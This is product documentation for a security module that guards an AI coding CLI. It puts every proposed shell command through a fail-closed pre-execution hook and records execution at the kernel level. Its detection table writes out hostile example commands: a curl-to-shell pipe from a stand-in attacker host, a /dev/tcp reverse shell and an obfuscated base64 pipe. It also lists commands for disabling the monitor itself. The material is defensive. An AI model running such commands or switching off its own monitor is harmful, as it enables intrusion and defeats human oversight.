# Claude Code Protection

## Overview

Official InnerWarden integration for Anthropic's **Claude Code** CLI. It adds an
in-path command guard that inspects every shell command Claude Code proposes
*before* it runs, backed by kernel-level execution monitoring for anything that
does run.

## Why a dedicated module

Claude Code is a *tool* (CLI coding assistant, per-task), not a long-running
autonomous agent. Its defining integration is different from the agent-oriented
[AI Agent Protection](../../openclaw-protection/docs/README.md) module: instead of
relying only on the advisory API, Claude Code is wired with a **fail-closed
PreToolUse hook** so the inspection is *enforcing*, not just advisory, even when
the agent uses its raw shell tool.

Claude Code is recognised as an `Official` integration in InnerWarden's agent
signature registry (`crates/agent-guard/src/signatures.rs`).

## Two layers, both shipped

### 1. Enforcing — pre-execution guard hook

```bash
innerwarden agent install-hook            # claude-code (default)
innerwarden agent install-hook --block-review   # also block "review" verdicts
```

This writes:

- a guard script at `~/.config/innerwarden/claude_code_guard.sh`, and
- a `PreToolUse` Bash hook into `~/.claude/settings.json`.

From then on, every shell command Claude Code intends to run is POSTed to the
loopback `check-command` brain and **blocked before it executes** when the verdict
is `deny` (or `review`, with `--block-review`). The hook **fails closed**: if the
InnerWarden agent is unreachable, the command is blocked rather than allowed
through.

Unlike `mcp-serve` / `check-command` (advisory only), this enforces even when the
agent uses its raw shell tool.

### 2. Observe — post-execution kernel detection

The `exec_audit` + `journald` collectors feed the `execution-guard` detector, so
anything that actually executes - including activity from a separate shell that
bypasses the hook - is still recorded at the kernel level. Detection sits below
userspace, so base64 / encoding / renaming binaries does not evade it.

## What it detects

| Pattern | Example | Severity |
|---------|---------|----------|
| Download + execute pipeline | `curl evil.com/install \| sh` | High |
| Reverse shell | `bash -i >& /dev/tcp/1.2.3.4/4444` | Critical |
| Execution from temp dirs | `/tmp/payload` | Low |
| Obfuscated commands | `base64 -d \| sh` | High |
| Persistence attempts | `crontab -e`, `systemctl enable` | Low |
| Security self-disable | `systemctl stop\|mask innerwarden-*`, `pkill -f innerwarden` | High |
| Config file tampering | changes to `/etc/`, agent configs | Medium |

The command inspector also refuses requests that would disable InnerWarden
itself (stop / mask / kill its services, `innerwarden uninstall`,
`rm -rf /etc/innerwarden`, `setenforce 0`), so an agent cannot be talked into
turning off the monitor at the command layer. Benign operations - reading status,
`systemctl status`, even `systemctl restart innerwarden-agent` - stay allowed.

## Configuration

Enable the module:

```bash
innerwarden enable claude-code-protection
```

This activates the `exec_audit`, `journald`, and `integrity` collectors and the
`execution-guard` detector (observe mode). Install the enforcing hook separately
with `innerwarden agent install-hook` (above).

### Monitoring Claude Code's own files

After enabling, add Claude Code's config/state paths to integrity monitoring in
`sensor.toml`:

```toml
[collectors.integrity]
paths = [
    "/etc/passwd",
    "/etc/shadow",
    "/etc/sudoers",
    # Claude Code (per-user)
    "/home/<user>/.claude/settings.json",
    "/home/<user>/.config/innerwarden/claude_code_guard.sh",
]
```

## Agent API

Beyond the hook, Claude Code (or a wrapper) can query the same loopback endpoints
the [AI Agent Protection](../../openclaw-protection/docs/README.md) module
documents:

- `GET  /api/agent/security-context` - current threat level + recommendation
- `GET  /api/agent/check-ip?ip=X` - IP reputation / block status
- `POST /api/agent/check-command` - analyse a command without executing it
  (the guard hook uses this)
- `POST /api/advisor/check-command` - same, but caches an `advisory_id` so an
  ignored `deny` that executes anyway can be correlated and escalated
- `GET  /api/events/stream` (SSE) - live incident alerts

The dashboard runs on `127.0.0.1:8787` by default over HTTPS (self-signed); the
guard script targets that URL and can be overridden with
`innerwarden agent install-hook --url <url>`.

## Recommended posture

Run Claude Code **unprivileged** (no passwordless sudo), behind the **fail-closed**
in-path hook, with this module's kernel detection on. For real in-kernel
*prevention* of the residual userspace activity, arm the paid Execution Gate
scoped to the Claude Code process tree (spec 083). See the
[integration recipe](../../../docs/integration-recipes/claude-code-agent-guard.md)
for step-by-step setup, verification, and troubleshooting.

## Security

- The agent API runs on the dashboard port (default `127.0.0.1:8787`) over HTTPS
  with a self-signed cert. Bind it to loopback in production unless remote access
  is required.
- When dashboard auth is configured, API requests require HTTP Basic Auth.
- `check-command` only **analyzes** commands - it never executes them.
- The guard hook **fails closed**: if the agent is unreachable, the command is
  blocked, not allowed through, so a downed monitor cannot silently wave commands
  past.
- Integrity-monitor the guard script and the agent's `settings.json` (see
  [Configuration](#configuration)) so tampering with the guard itself is detected.

## Architecture

```
Claude Code (claude / claude-code)
    │
    ├── proposes a Bash command ─► PreToolUse hook ─► POST /api/agent/check-command
    │                                                       │  (deny ⇒ block, exit 2;
    │                                                       │   unreachable ⇒ fail closed)
    │                                                       ▼
    ├── command runs (if allowed) ─► auditd EXECVE ─► exec_audit ─► execution-guard
    │                                                       │
    └── receives SSE alerts ◄────── dashboard ◄──── agent ◄┘  (detects + records)
```

The hook stops dangerous commands before they run; the kernel layer records
whatever does run, including activity from any shell that bypasses the hook.
